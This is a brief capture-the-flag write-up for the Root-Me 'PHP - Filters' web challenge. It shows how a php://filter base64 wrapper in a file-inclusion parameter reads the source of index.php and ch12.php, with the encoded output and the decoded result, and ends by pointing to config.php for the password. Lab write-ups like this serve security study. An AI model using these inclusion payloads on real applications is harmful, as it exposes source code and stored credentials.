# PHP Filters

[root-me challenge: PHP - Filters](https://www.root-me.org/en/Challenges/Web-Server/PHP-Filters): FileManager v 0.01 | Retrieve the administrator password of this application.

----

```text
/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=index.php
```

Gives:

```text

PD9waHAgaW5jbHVkZSgiY2gxMi5waHAiKTs/Pg==
```

Base64 decode:

```text
<?php include("ch12.php");?>
```

```text
web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=ch12.php
```

Gives:

```text
PD9waHAKCiRpbmM9ImFjY3VlaWwucGhwIjsKaWYgKGlzc2V0KCRfR0VUWyJpbmMiXSkpIHsKICAgICRpbmM9JF9HRVRbJ2luYyddOwogICAgaWYgKGZpbGVfZXhpc3RzKCRpbmMpKXsKCSRmPWJhc2VuYW1lKHJlYWxwYXRoKCRpbmMpKTsKCWlmICgkZiA9PSAiaW5kZXgucGhwIiB8fCAkZiA9PSAiY2gxMi5waHAiKXsKCSAgICAkaW5jPSJhY2N1ZWlsLnBocCI7Cgl9CiAgICB9Cn0KCmluY2x1ZGUoImNvbmZpZy5waHAiKTsKCgplY2hvICcKICA8aHRtbD4KICA8Ym9keT4KICAgIDxoMT5GaWxlTWFuYWdlciB2IDAuMDE8L2gxPgogICAgPHVsPgoJPGxpPjxhIGhyZWY9Ij9pbmM9YWNjdWVpbC5waHAiPmhvbWU8L2E
```

Base64 decode:

```text
<?php
...
include("config.php");
...
```

Decode, and get password.

## Resources

* [LFI/RFI using PHP wrappers & protocols](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-rfi-using-php-wrappers-and-protocols)
